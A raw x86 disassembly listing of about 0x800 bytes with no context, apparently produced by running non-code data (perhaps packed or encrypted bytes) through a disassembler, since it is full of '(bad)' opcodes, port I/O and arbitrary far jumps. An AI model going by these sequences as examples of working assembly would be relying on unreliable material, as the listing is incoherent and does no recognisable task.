  419362:	add    BYTE PTR [ebx+0x1964d28f],dl
  419368:	push   esp
  419369:	aam    0xc
  41936b:	xchg   ecx,eax
  41936c:	and    BYTE PTR [ecx],cl
  41936e:	fsub   QWORD PTR [ebx]
  419370:	xchg   ecx,edi
  419372:	dec    ebx
  419373:	jnp    0x4193e9
  419375:	or     BYTE PTR [edx-0x26],dh
  419378:	inc    edi
  419379:	mov    BYTE PTR [ebp+0x3c],bl
  41937c:	fidivr WORD PTR [ebx+0x75]
  41937f:	xchg   ebx,eax
  419380:	mov    DWORD PTR [ebx],0x415c57d3
  419386:	jb     0x41930e
  419388:	cmp    eax,0x601ed564
  41938d:	ror    BYTE PTR [edi],cl
  41938f:	xor    BYTE PTR [eax],dh
  419391:	cli    
  419392:	(bad)  
  419393:	clc    
  419394:	loope  0x4193c1
  419396:	outs   dx,BYTE PTR ds:[esi]
  419397:	aad    0x9d
  419399:	sub    eax,0xc46211a8
  41939e:	pop    esi
  41939f:	push   ss
  4193a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a1:	rol    DWORD PTR [ebp-0x5],0x43
  4193a5:	ds push ebp
  4193a7:	leave  
  4193a8:	pop    eax
  4193a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193aa:	std    
  4193ab:	mov    WORD PTR [edx-0x5b],?
  4193ae:	push   edi
  4193af:	out    dx,al
  4193b0:	test   eax,0x5c95b574
  4193b5:	pushf  
  4193b6:	jo     0x41934f
  4193b8:	cld    
  4193b9:	dec    esp
  4193ba:	ret    
  4193bb:	es ror eax,0x22
  4193bf:	(bad)  
  4193c1:	loope  0x419376
  4193c3:	adc    ah,BYTE PTR [esi+0x4]
  4193c6:	inc    edi
  4193c7:	inc    eax
  4193c8:	mov    cl,BYTE PTR [eax]
  4193ca:	daa    
  4193cb:	fisttp QWORD PTR [edx]
  4193cd:	mov    eax,ds:0x5c0d724b
  4193d2:	rcl    esi,1
  4193d4:	stos   DWORD PTR es:[edi],eax
  4193d5:	xor    BYTE PTR [eax-0x23],0x83
  4193d9:	lods   eax,DWORD PTR ds:[esi]
  4193da:	ins    BYTE PTR es:[edi],dx
  4193db:	into   
  4193dc:	xlat   BYTE PTR ds:[ebx]
  4193dd:	fld    TBYTE PTR fs:[ecx]
  4193e0:	cs scas al,BYTE PTR es:[edi]
  4193e2:	ds pop es
  4193e4:	shr    BYTE PTR [esi+ecx*8-0x38],cl
  4193e8:	in     al,0xf2
  4193ea:	ins    DWORD PTR es:[edi],dx
  4193eb:	xor    BYTE PTR [eax-0x1d],ah
  4193ee:	or     ah,dl
  4193f0:	retf   
  4193f1:	(bad)
  4193f5:	inc    ebp
  4193f6:	jmp    0x9f6546f3
  4193fb:	add    DWORD PTR [eax-0xf126f89],esp
  419401:	xor    edx,eax
  419403:	jg     0x4193b9
  419405:	jno    0x4193b0
  419407:	or     eax,0x7e3d35d4
  41940c:	dec    edi
  41940d:	sti    
  41940e:	inc    eax
  41940f:	adc    BYTE PTR [ebx+0x63128248],al
  419415:	je     0x4193d1
  419417:	mov    eax,ds:0xa67a7788
  41941c:	es jne 0x41948e
  41941f:	pop    ecx
  419420:	mov    ebp,0x8b0555d7
  419425:	inc    ecx
  419426:	mov    edx,0x38a90698
  41942b:	dec    ebx
  41942c:	push   ds
  41942d:	icebp  
  41942e:	adc    ebx,DWORD PTR [edx-0x7506a010]
  419434:	sub    eax,0xd6e3a72e
  419439:	mov    ds:0xf990a5bb,al
  41943e:	repnz dec esi
  419440:	inc    eax
  419441:	call   0xecbd:0x397327a
  419448:	push   cs
  419449:	jp     0x419432
  41944b:	jle    0x419416
  41944d:	in     eax,0xe2
  41944f:	test   dh,0x7e
  419452:	or     eax,0x4e6a329
  419457:	xchg   edi,eax
  419458:	aas    
  419459:	push   esi
  41945a:	or     BYTE PTR [esi+0x2005863d],al
  419460:	cmp    eax,0x2451c21f
  419465:	xchg   ebp,eax
  419466:	sti    
  419467:	add    dh,BYTE PTR [eax-0x64f8d5e9]
  41946d:	sti    
  41946e:	mov    ds:0x279d4b52,eax
  419473:	cmp    bh,BYTE PTR [ebp+ebp*8-0x23cdfd1b]
  41947a:	cmp    BYTE PTR [ebx],dh
  41947c:	lahf   
  41947d:	shl    DWORD PTR [ebx],1
  41947f:	inc    eax
  419480:	cmp    al,dl
  419482:	out    dx,eax
  419483:	and    BYTE PTR [eax+0x75ac6b9a],ah
  419489:	jnp    0x41944f
  41948b:	inc    ebx
  41948c:	dec    ebx
  41948d:	dec    ecx
  41948e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41948f:	psrld  mm4,0x6
  419493:	ins    BYTE PTR es:[edi],dx
  419494:	sbb    BYTE PTR [eax],dl
  419496:	cli    
  419497:	and    DWORD PTR [edi+eax*2-0xbf37226],ebx
  41949e:	mov    al,ds:0x9bfdaba5
  4194a3:	rcl    cl,0xb0
  4194a6:	fst    DWORD PTR [edi]
  4194a8:	stc    
  4194a9:	jmp    0x62f0:0x5584dbec
  4194b0:	cmp    DWORD PTR [esp+edi*2-0x376621ab],0x56
  4194b8:	out    dx,al
  4194b9:	add    bl,al
  4194bb:	cwde   
  4194bc:	dec    ebp
  4194bd:	or     DWORD PTR [ebx+0x20],0xb496fef9
  4194c4:	xor    DWORD PTR [esp+eax*2-0x62],esi
  4194c8:	or     eax,0x2f29e78c
  4194cd:	inc    ebx
  4194ce:	adc    DWORD PTR [eax-0x76],eax
  4194d1:	stos   BYTE PTR es:[edi],al
  4194d2:	js     0x4194cf
  4194d4:	and    esp,DWORD PTR [esi+0x39]
  4194d7:	inc    ecx
  4194d8:	push   ds
  4194d9:	mov    ch,0x26
  4194db:	add    DWORD PTR ds:0xde468204,0x0
  4194e2:	fcomp  QWORD PTR [edx-0x35]
  4194e5:	aaa    
  4194e6:	test   al,0xeb
  4194e8:	retf   
  4194e9:	icebp  
  4194ea:	adc    eax,0xdb246c88
  4194ef:	jecxz  0x4194d9
  4194f1:	dec    esp
  4194f2:	(bad)  
  4194f3:	aam    0xb5
  4194f5:	xlat   BYTE PTR ds:[ebx]
  4194f6:	aad    0xb8
  4194f8:	aaa    
  4194f9:	imul   ecx,DWORD PTR [edx],0x25a6fa9
  4194ff:	fwait
  419500:	pop    es
  419501:	mov    gs,WORD PTR [ebx-0x33]
  419504:	xchg   BYTE PTR [edi-0x5b],cl
  419507:	push   ss
  419508:	stos   WORD PTR es:[edi],ax
  41950a:	jnp    0x419585
  41950c:	dec    edx
  41950d:	outs   dx,DWORD PTR ss:[esi]
  41950f:	pop    ecx
  419510:	ins    DWORD PTR es:[edi],dx
  419511:	push   ds
  419512:	test   DWORD PTR [edx+0x6e],edx
  419515:	fadd   QWORD PTR [esp+esi*4+0x22]
  419519:	les    esi,FWORD PTR ds:0x7a209308
  41951f:	pop    edx
  419520:	repnz and BYTE PTR [ebx-0x2e122fd4],0xbe
  419528:	cmp    eax,0x31d384a7
  41952d:	pusha  
  41952e:	test   BYTE PTR [esi],0x3d
  419531:	adc    dl,BYTE PTR ds:0x36d15372
  419537:	pop    edi
  419538:	mov    ebx,0x794cba65
  41953d:	xchg   edi,eax
  41953e:	les    eax,FWORD PTR [esi+0x2fcf620c]
  419544:	cs push cs
  419546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419547:	call   0x6351:0x459719
  41954e:	mov    esi,0x5809edd
  419553:	add    BYTE PTR [ebx],ah
  419555:	and    eax,0x2445ed49
  41955a:	js     0x41957f
  41955c:	xor    DWORD PTR [edx+0x18],edx
  41955f:	cmp    al,0x20
  419561:	cmp    bl,BYTE PTR [edi+0xe]
  419564:	xchg   ebp,eax
  419565:	mov    DWORD PTR [ecx+edi*2+0x34],edi
  419569:	in     al,0x57
  41956b:	fnstsw WORD PTR [ebx-0x765900bb]
  419571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419572:	and    bl,BYTE PTR [esi-0x64cbdf12]
  419578:	aam    0x8f
  41957a:	fs aam 0xe4
  41957d:	jno    0x4195a2
  41957f:	cs dec esp
  419581:	fstp   QWORD PTR [edx]
  419583:	jmp    0x4195c6
  419585:	ret    0x948c
  419588:	sub    edx,esi
  41958a:	mov    edi,0xe6359605
  41958f:	push   esi
  419590:	dec    eax
  419591:	xor    eax,0x86f1f9c7
  419596:	cdq    
  419597:	or     ebp,esp
  419599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41959a:	push   cs
  41959b:	add    ch,BYTE PTR [edx+0x32]
  41959e:	fdivr  QWORD PTR [esi]
  4195a0:	loop   0x4195af
  4195a2:	or     edx,DWORD PTR [esi+0x7ad4aa06]
  4195a8:	stos   BYTE PTR es:[edi],al
  4195a9:	call   0x84f8:0x5c3484c1
  4195b0:	cli    
  4195b1:	rol    DWORD PTR [ebx-0x38f24feb],0x28
  4195b8:	xor    BYTE PTR [esi+0x4e],0xa
  4195bc:	mov    dl,0xc3
  4195be:	xor    cl,0xc1
  4195c1:	lea    ecx,[ecx-0x4c]
  4195c4:	jbe    0x4195b9
  4195c6:	and    bl,BYTE PTR [esp+eax*1-0x23]
  4195ca:	daa    
  4195cb:	mov    ebx,0xe9d9b059
  4195d0:	rcl    esp,1
  4195d2:	ret    
  4195d3:	call   0x2e5feddb
  4195d8:	and    eax,0xf49cb4f7
  4195dd:	inc    esp
  4195de:	pop    ebx
  4195df:	sar    DWORD PTR [ebx],0x99
  4195e2:	fsub   DWORD PTR [edx-0x21]
  4195e5:	ss adc eax,0xa4f73f74
  4195eb:	in     al,0xb3
  4195ed:	xor    al,BYTE PTR [esp+esi*2]
  4195f0:	in     eax,dx
  4195f1:	or     eax,0x491f5c92
  4195f6:	(bad)  
  4195f7:	out    dx,eax
  4195f8:	push   cs
  4195f9:	push   esp
  4195fa:	out    0xf9,al
  4195fc:	or     BYTE PTR [edi+0x4a],dh
  4195ff:	das    
  419600:	ret    
  419601:	fwait
  419602:	add    eax,0x9fcfdb1
  419607:	repnz and ebx,DWORD PTR [edi]
  41960a:	(bad)  
  41960b:	shr    BYTE PTR [ecx+0x25e66dfd],0x29
  419612:	mov    dl,0x68
  419614:	mov    eax,ds:0x60f68e89
  419619:	adc    eax,0xd46f96c8
  41961e:	add    ah,BYTE PTR [ecx+eiz*1-0x3]
  419622:	rcr    BYTE PTR [edi+edi*1],0x64
  419626:	stos   DWORD PTR es:[edi],eax
  419627:	or     ebp,0x6852b47e
  41962d:	mov    edx,0x65dc9542
  419632:	and    BYTE PTR [eax],bh
  419634:	xor    al,0x17
  419636:	fistp  WORD PTR [eax+edi*8-0x5b]
  41963a:	pop    ebp
  41963b:	cdq    
  41963c:	(bad)  
  41963d:	mov    ah,0x98
  41963f:	or     BYTE PTR [eax-0x5c],dl
  419642:	adc    edx,DWORD PTR [ebx-0x6c]
  419645:	loop   0x419655
  419647:	jnp    0x419624
  419649:	ficomp WORD PTR [ebx+0x3e154f70]
  41964f:	loopne 0x419659
  419651:	sub    eax,DWORD PTR [edx-0x50]
  419654:	mov    ch,0x7b
  419656:	into   
  419657:	xor    DWORD PTR [eax],esi
  419659:	push   esp
  41965a:	cmp    bh,BYTE PTR [edx]
  41965c:	add    eax,0x45f0554a
  419661:	jg     0x419602
  419663:	(bad)  
  419664:	mov    dh,0x95
  419666:	mov    dh,0x58
  419668:	push   0xdd061c93
  41966d:	xchg   esi,eax
  41966e:	scas   al,BYTE PTR es:[edi]
  41966f:	(bad)  
  419671:	inc    edi
  419672:	fldcw  WORD PTR [ebp+0x72]
  419675:	add    eax,0x41cd8638
  41967a:	pop    ebp
  41967b:	scas   eax,DWORD PTR es:[edi]
  41967c:	sti    
  41967d:	loopne 0x419696
  41967f:	push   esp
  419680:	mov    cl,0x50
  419682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419683:	aaa    
  419684:	stos   DWORD PTR es:[edi],eax
  419685:	loopne 0x41967c
  419687:	dec    esp
  419688:	add    DWORD PTR [esi+0x72ca0183],ebx
  41968e:	cli    
  41968f:	push   ds
  419690:	pminsw mm7,QWORD PTR [ecx-0x72]
  419694:	ret    0x17de
  419697:	jne    0x419662
  419699:	xchg   ebp,eax
  41969a:	out    0x97,al
  41969c:	xchg   DWORD PTR [ecx-0x106a4ee0],esp
  4196a2:	std    
  4196a3:	(bad)  
  4196a4:	jle    0x419655
  4196a6:	cmp    ch,BYTE PTR [ecx]
  4196a8:	mov    ebx,0xa19b6efe
  4196ad:	and    eax,0xfc07564
  4196b2:	pop    ecx
  4196b3:	mov    ds:0x609835f6,eax
  4196b8:	push   esi
  4196b9:	aas    
  4196ba:	jg     0x419718
  4196bc:	cdq    
  4196bd:	adc    BYTE PTR [edx],ah
  4196bf:	sbb    BYTE PTR [ebp-0x28f3d736],al
  4196c5:	or     al,0x4f
  4196c7:	pop    esi
  4196c8:	retf   0x6952
  4196cb:	push   ecx
  4196cc:	adc    al,0x99
  4196cf:	mov    al,BYTE PTR [edx-0x44e256a2]
  4196d5:	mov    dh,0xc2
  4196d7:	sar    DWORD PTR [edx+eax*2-0x206b5d04],1
  4196de:	xor    al,0xcc
  4196e0:	inc    ebx
  4196e1:	stos   DWORD PTR es:[edi],eax
  4196e2:	push   ebx
  4196e3:	mov    dh,BYTE PTR [esi-0xe]
  4196e6:	sub    cl,BYTE PTR [ecx-0x49]
  4196e9:	sub    BYTE PTR [edi],cl
  4196eb:	push   0xfffffff5
  4196ed:	push   ebp
  4196ee:	je     0x4196fb
  4196f0:	inc    esp
  4196f1:	sub    al,0x94
  4196f3:	mov    ds,WORD PTR [edi]
  4196f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f6:	mov    bl,0xed
  4196f8:	inc    edi
  4196f9:	sbb    cl,BYTE PTR [ebx+esi*4-0x2f]
  4196fd:	inc    DWORD PTR [ebp+0x82cdd9c]
  419703:	push   esp
  419704:	xchg   ch,bl
  419706:	es mov cl,0xaa
  419709:	xlat   BYTE PTR ds:[ebx]
  41970a:	ret    
  41970b:	inc    esi
  41970c:	int    0x57
  41970e:	sbb    cl,BYTE PTR [ecx+0x3eb40ef1]
  419714:	mov    ah,0x26
  419716:	(bad)  
  419717:	and    BYTE PTR [ebx+0x257a6536],al
  41971d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41971e:	inc    esp
  41971f:	mov    cl,0x93
  419721:	test   BYTE PTR [eax+0x1b1ea4b6],cl
  419727:	pushf  
  419728:	push   cs
  419729:	mov    dl,ch
  41972b:	add    ebp,esi
  41972d:	pusha  
  41972e:	push   0xffffff86
  419730:	push   ss
  419731:	test   al,0x80
  419733:	ins    BYTE PTR es:[edi],dx
  419734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419735:	out    dx,al
  419736:	xor    BYTE PTR [edx+edx*2-0x694cb7b7],ch
  41973d:	hlt    
  41973e:	out    0xec,eax
  419740:	jle    0x41975d
  419742:	cmp    eax,0x8ac151ae
  419747:	mov    dh,0x76
  419749:	cmp    al,0xb0
  41974b:	adc    al,0x5f
  41974d:	loop   0x4196e7
  41974f:	in     eax,dx
  419750:	add    bl,ch
  419752:	icebp  
  419753:	aas    
  419754:	stos   DWORD PTR es:[edi],eax
  419755:	das    
  419756:	xor    DWORD PTR [ecx],edx
  419758:	test   al,0xa
  41975a:	jecxz  0x41974a
  41975c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41975d:	mov    dh,0xa4
  41975f:	sti    
  419760:	dec    edx
  419761:	xor    ebx,edx
  419763:	cmp    bl,bl
  419765:	fwait
  419766:	push   esp
  419767:	mov    bh,0xec
  419769:	pop    ecx
  41976a:	adc    dl,dh
  41976c:	inc    ebx
  41976d:	stos   BYTE PTR es:[edi],al
  41976e:	xor    eax,0xac4c63b1
  419773:	scas   eax,DWORD PTR es:[edi]
  419774:	cmp    dl,BYTE PTR gs:[ebp-0x35]
  419778:	pusha  
  419779:	rcl    BYTE PTR [esi-0x3283e9ed],1
  41977f:	stc    
  419780:	fisubr WORD PTR [edi+0x543b49a7]
  419786:	sbb    ecx,esi
  419788:	dec    edi
  419789:	jnp    0x4197d6
  41978b:	adc    BYTE PTR [ebp+esi*8-0x1b8e76fe],0x99
  419793:	ss enter 0xd411,0x9a
  419798:	pop    fs
  41979a:	lods   eax,DWORD PTR ds:[esi]
  41979b:	enter  0xea61,0x5b
  41979f:	sbb    esp,DWORD PTR [ebx]
  4197a1:	or     eax,0xaec27c3d
  4197a6:	pusha  
  4197a7:	stc    
  4197a8:	cmc    
  4197a9:	add    al,0xba
  4197ab:	es xchg esi,eax
  4197ad:	call   0x5b99:0xc9a6826b
  4197b4:	call   0xc41928f0
  4197b9:	stos   BYTE PTR es:[edi],al
  4197ba:	jmp    DWORD PTR [edi+0xa]
  4197bd:	jmp    0xd617:0x8fae1336
  4197c4:	div    BYTE PTR [ecx+0x25f1c1eb]
  4197ca:	in     eax,dx
  4197cb:	lock (bad) 
  4197cd:	aad    0xd6
  4197cf:	and    eax,0x4917a767
  4197d4:	and    edx,0xe0819a62
  4197da:	ret    0xcf87
  4197dd:	iret   
  4197de:	sbb    ecx,DWORD PTR [ebp+0x267bf520]
  4197e4:	popf   
  4197e5:	dec    ebx
  4197e6:	mov    ah,0x46
  4197e8:	sub    bl,al
  4197ea:	pop    esi
  4197eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ec:	ret    0xc9fa
  4197ef:	inc    cx
  4197f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f2:	aas    
  4197f3:	sar    BYTE PTR [eax],cl
  4197f5:	and    eax,0xb72a5783
  4197fb:	jg     0x4197cb
  4197fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fe:	mov    ds:0xeb3e54f5,al
  419803:	popa   
  419804:	xchg   esi,eax
  419805:	and    BYTE PTR [eax-0x267145d],ah
  41980b:	cli    
  41980c:	mov    edi,0xd566de4e
  419811:	fadd   QWORD PTR [edi-0x7d]
  419814:	or     BYTE PTR [eax+0x4a],dh
  419817:	loopne 0x41983d
  419819:	enter  0xfc75,0xb
  41981d:	sbb    BYTE PTR [ebx+edi*8-0x35b8fb5e],ch
  419824:	sub    eax,0xca44378f
  419829:	xchg   ebp,eax
  41982a:	add    eax,0x838748cb
  419830:	ja     0x4197c5
  419832:	pop    esi
  419833:	xlat   BYTE PTR ds:[ebx]
  419834:	add    eax,0x23eb57a3
  419839:	jmp    0xf8b62a2f
  41983e:	popa   
  41983f:	out    dx,eax
  419840:	pop    ebp
  419841:	mov    dl,0xe0
  419843:	call   0x6f32c57b
  419848:	into   
  419849:	call   0x3f08:0x3f0e137a
  419850:	sbb    bh,BYTE PTR [edi+0x2403e709]
  419856:	sub    edx,ecx
  419858:	leave  
  419859:	fst    QWORD PTR [esi+0x5c]
  41985c:	ja     0x4198d7
  41985e:	pop    ebx
  41985f:	stos   DWORD PTR es:[edi],eax
  419860:	mov    eax,ds:0xa08be7b5
  419865:	ins    DWORD PTR es:[edi],dx
  419866:	(bad)  
  419868:	into   
  419869:	mov    eax,0xfa781374
  41986e:	fcmove st,st(2)
  419870:	mov    BYTE PTR [edx],0x5c
  419873:	(bad)  
  419874:	push   0xd14b387
  419879:	push   0x31
  41987b:	fldlg2 
  41987d:	jb     0x4198ef
  41987f:	(bad)  
  419880:	pop    ebx
  419881:	or     ebx,0xec0beb91
  419887:	and    eax,0xe5174d90
  41988c:	push   edx
  41988d:	retf   0x29ff
  419890:	adc    DWORD PTR [esi-0x32241db5],ebx
  419896:	cmp    esp,esp
  419898:	shl    DWORD PTR fs:[esi+0x69],1
  41989c:	add    dl,dh
  41989e:	ret    
  41989f:	xor    BYTE PTR [edi+0x7d],ah
  4198a2:	mov    bl,BYTE PTR [ebp+edx*2-0x699268d1]
  4198a9:	or     BYTE PTR [ebx+0x6957e3c7],dh
  4198af:	ret    0xf962
  4198b2:	dec    ebx
  4198b3:	clc    
  4198b4:	call   0xdb0d:0xf06d47a8
  4198bb:	neg    cl
  4198bd:	xor    ebp,DWORD PTR [bx+di+0xf]
  4198c1:	pop    esp
  4198c2:	std    
  4198c3:	mov    ebx,0x744c7520
  4198c8:	aas    
  4198c9:	mov    ecx,0x36830fc8
  4198ce:	mov    eax,ds:0x1342803f
  4198d3:	retf   
  4198d4:	and    al,0x57
  4198d6:	dec    esp
  4198d7:	test   DWORD PTR ds:0xb221f62e,esp
  4198dd:	cli    
  4198de:	out    0x64,eax
  4198e0:	and    eax,0xa5ad225b
  4198e5:	in     eax,dx
  4198e6:	cli    
  4198e7:	leave  
  4198e8:	push   ss
  4198e9:	daa    
  4198ea:	xor    cl,bh
  4198ec:	idiv   DWORD PTR [ebp+0x7f]
  4198ef:	inc    ebx
  4198f0:	adc    al,0x90
  4198f2:	hlt    
  4198f3:	pop    esi
  4198f4:	inc    edx
  4198f5:	push   ecx
  4198f6:	sub    al,0xd6
  4198f8:	xor    eax,0x8dbefaba
  4198fd:	test   eax,0x71534ea9
  419902:	das    
  419903:	loopne 0x41993f
  419905:	pop    esi
  419906:	(bad)  
  419907:	lea    eax,[ebp+edx*4-0x73]
  41990b:	push   ds
  41990c:	add    edx,DWORD PTR [esi-0x2a]
  41990f:	retf   0x7a84
  419912:	cmp    DWORD PTR [esi],esi
  419914:	cmp    al,0xa8
  419916:	and    dh,bh
  419918:	mov    ch,0x49
  41991a:	adc    ebx,DWORD PTR [eax+0x2826ab73]
  419920:	ins    DWORD PTR es:[edi],dx
  419921:	push   ebp
  419922:	fst    st(4)
  419924:	xchg   edi,eax
  419925:	shr    ch,1
  419927:	leave  
  419928:	popf   
  419929:	loop   0x4199a5
  41992b:	int3   
  41992c:	dec    esi
  41992d:	stc    
  41992e:	xor    edx,esi
  419930:	(bad)  
  419931:	cmp    edx,DWORD PTR [edi+0x22e7716]
  419937:	(bad)  
  419938:	ja     0x4199b8
  41993a:	fild   DWORD PTR [esi-0x146816dc]
  419940:	(bad)  
  419941:	cld    
  419942:	or     DWORD PTR [ebx],ecx
  419944:	pusha  
  419945:	mov    dh,0x6b
  419947:	ret    
  419948:	add    BYTE PTR [esi+0x3436232],ch
  41994e:	pop    ds
  41994f:	sar    DWORD PTR [ecx+eiz*1-0x6b],1
  419953:	ja     0x41993f
  419955:	scas   eax,DWORD PTR es:[edi]
  419956:	sbb    BYTE PTR [eax],bh
  419958:	push   ss
  419959:	mov    ah,0x44
  41995b:	mov    DWORD PTR [ebx+0x61],edx
  41995e:	enter  0xbb1c,0x4d
  419962:	cld    
  419963:	mov    dh,0x7b
  419965:	mov    WORD PTR [esp+edx*1+0x2],?
  419969:	or     BYTE PTR [ebx],bl
  41996b:	mov    cl,BYTE PTR [ebx]
  41996d:	jns    0x41992c
  41996f:	or     al,BYTE PTR [ecx-0x3447dc0a]
  419975:	or     DWORD PTR [ecx+0x7d6d60b4],esp
  41997b:	push   esi
  41997c:	jno    0x419913
  41997e:	sbb    dl,cl
  419980:	push   ebp
  419981:	jecxz  0x4199fb
  419983:	push   cs
  419984:	retf   
  419985:	xchg   ecx,eax
  419986:	xchg   ebx,eax
  419987:	push   esi
  419988:	pop    eax
  419989:	mov    ebp,0x500a7b1b
  41998e:	lock sbb al,0x29
  419991:	out    dx,al
  419992:	aad    0xa
  419994:	(bad)  
  419996:	(bad)  
  419998:	add    ebp,DWORD PTR [ebx+edx*1-0x3da650e5]
  41999f:	dec    ebx
  4199a0:	in     al,0xc8
  4199a2:	(bad)  
  4199a3:	push   edx
  4199a4:	mov    cs,WORD PTR [edx]
  4199a6:	ret    0x9135
  4199a9:	push   eax
  4199aa:	ss jg  0x4199bd
  4199ad:	sub    BYTE PTR [ebx-0xb579477],cl
  4199b3:	jnp    0x419998
  4199b5:	adc    BYTE PTR [ecx+0x68655611],bl
  4199bb:	outs   dx,DWORD PTR ds:[esi]
  4199bc:	dec    edi
  4199bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199be:	push   ebx
  4199bf:	jno    0x419a20
  4199c1:	test   esp,esp
  4199c3:	xchg   DWORD PTR [edi+0x0],ebp
  4199c6:	dec    ebx
  4199c7:	xchg   BYTE PTR [ebp+0x354c4491],dh
  4199cd:	and    al,BYTE PTR [esi+0x6d7c5b08]
  4199d3:	and    ah,BYTE PTR [esi]
  4199d5:	jae    0x419a2a
  4199d7:	inc    ecx
  4199d8:	adc    DWORD PTR [ebp+0x3bcac789],ebx
  4199de:	dec    ebx
  4199df:	sub    eax,0xb7428c9f
  4199e4:	out    dx,al
  4199e5:	es mov ecx,0x33329088
  4199eb:	mov    ecx,0x9a71b2f9
  4199f0:	retf   0xa3fd
  4199f3:	jle    0x419a35
  4199f5:	lods   al,BYTE PTR ds:[esi]
  4199f6:	dec    edi
  4199f7:	cmp    al,0x3b
  4199f9:	dec    esp
  4199fa:	repz imul ebx,DWORD PTR [ebx],0xea1631da
  419a01:	retf   0x788c
  419a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a05:	arpl   WORD PTR [eax+0x74],si
  419a08:	cdq    
  419a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a0a:	dec    ebp
  419a0b:	sub    DWORD PTR [edi],ecx
  419a0d:	jmp    0xd7bb445f
  419a12:	inc    esp
  419a13:	ins    BYTE PTR es:[edi],dx
  419a14:	mov    edx,0xadd04a18
  419a19:	out    0x32,al
  419a1b:	lds    esp,FWORD PTR [ebp+0x2ff55afc]
  419a21:	push   0x16dd961c
  419a26:	add    BYTE PTR [eax-0x40aa7f76],0x2d
  419a2d:	mov    eax,0x413b5d5b
  419a32:	out    dx,al
  419a33:	or     DWORD PTR ds:0x5bc5324b,ecx
  419a39:	out    dx,al
  419a3a:	xor    ecx,ebp
  419a3c:	sahf   
  419a3d:	ja     0x4199d2
  419a3f:	dec    ecx
  419a40:	dec    eax
  419a41:	sbb    ecx,0xffffffa5
  419a44:	pop    edx
  419a45:	loopne 0x419a12
  419a47:	or     al,0xad
  419a49:	jnp    0x419a2f
  419a4b:	in     eax,dx
  419a4c:	ret    
  419a4d:	inc    edi
  419a4e:	daa    
  419a4f:	je     0x419a48
  419a51:	mov    esi,DWORD PTR [edx-0x512f5525]
  419a57:	int3   
  419a58:	sbb    BYTE PTR [edx-0x19f03614],0x28
  419a5f:	ficom  DWORD PTR [eax-0x4c]
  419a62:	and    eax,0xaff6ee08
  419a67:	sbb    ch,dh
  419a69:	xlat   BYTE PTR ds:[ebx]
  419a6a:	scas   al,BYTE PTR es:[edi]
  419a6b:	mov    edx,DWORD PTR [ebx-0x5c]
  419a6e:	aad    0xc
  419a70:	leave  
  419a71:	adc    ebp,DWORD PTR [bx+di]
  419a74:	out    0x78,al
  419a76:	push   esp
  419a77:	xchg   BYTE PTR [esi],ch
  419a79:	push   edi
  419a7a:	mov    dl,BYTE PTR [ecx-0x1]
  419a7d:	dec    ecx
  419a7e:	imul   ebx,ecx,0x63a2a4c
  419a84:	ss pop eax
  419a86:	inc    eax
  419a87:	div    DWORD PTR [ecx]
  419a89:	adc    eax,0x8709ab84
  419a8e:	xor    eax,edi
  419a90:	ins    BYTE PTR es:[edi],dx
  419a91:	pop    esp
  419a92:	push   esi
  419a93:	js     0x419a61
  419a95:	push   edi
  419a96:	mov    dh,0xcd
  419a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a99:	add    dl,ah
  419a9b:	add    al,0xaf
  419a9d:	pop    ecx
  419a9e:	adc    eax,0x3dadfc49
  419aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa4:	xchg   ebx,eax
  419aa5:	icebp  
  419aa6:	jle    0x419b27
  419aa8:	adc    DWORD PTR [edx],ebx
  419aaa:	sbb    al,0xa4
  419aac:	and    bh,BYTE PTR [eax+edi*4+0x70294f33]
  419ab3:	pop    edx
  419ab4:	mov    edi,0xe7be1d39
  419ab9:	pusha  
  419aba:	sub    BYTE PTR [eax],al
  419abc:	in     al,dx
  419abd:	fstp   TBYTE PTR [edx+edi*8+0x79]
  419ac1:	(bad)  
  419ac2:	mov    ah,BYTE PTR [esi-0x1e97f4e7]
  419ac8:	push   0x26
  419aca:	mov    ch,0xc6
  419acc:	mov    ecx,0x1128b73f
  419ad1:	inc    eax
  419ad2:	xor    esi,DWORD PTR [esi+0x42]
  419ad5:	xor    esp,DWORD PTR [esi-0x4a]
  419ad8:	push   eax
  419ad9:	jb     0x419b44
  419adb:	or     al,0x3c
  419add:	imul   eax,ebx,0x74d7db8f
  419ae3:	fcom   QWORD PTR [esi+0x405a0490]
  419ae9:	lea    edx,[ecx-0x35]
  419aec:	(bad)  
  419aed:	call   0xb97f8a68
  419af2:	xchg   edx,eax
  419af3:	or     BYTE PTR [edx+eiz*8+0x6a],cl
  419af7:	sub    al,0x2
  419af9:	imul   ebp,DWORD PTR [si],0x6cb682f5
  419b00:	out    0x27,eax
  419b02:	cli    
  419b03:	in     al,0x8d
  419b05:	ret    0xdb9c
  419b08:	shr    ecx,0x7a
  419b0b:	mov    dh,0x5e
  419b0d:	(bad)  
  419b0e:	fadd   DWORD PTR [ecx]
  419b10:	and    dh,BYTE PTR [ebp-0x2f44501]
  419b16:	test   BYTE PTR [esp+eiz*4],0xdd
  419b1a:	push   ss
  419b1b:	stos   BYTE PTR es:[edi],al
  419b1c:	push   0xffffffec
  419b1e:	ss repnz dec ebx
  419b21:	adc    bh,dh
  419b23:	cmp    al,0x6d
  419b25:	and    cl,bh
  419b27:	sub    al,0x6d
  419b29:	jnp    0x419af7
  419b2b:	out    dx,eax
  419b2c:	aam    0xf0
  419b2e:	xchg   esi,eax
  419b2f:	pop    esi
  419b30:	(bad)  
  419b31:	loop   0x419ae4
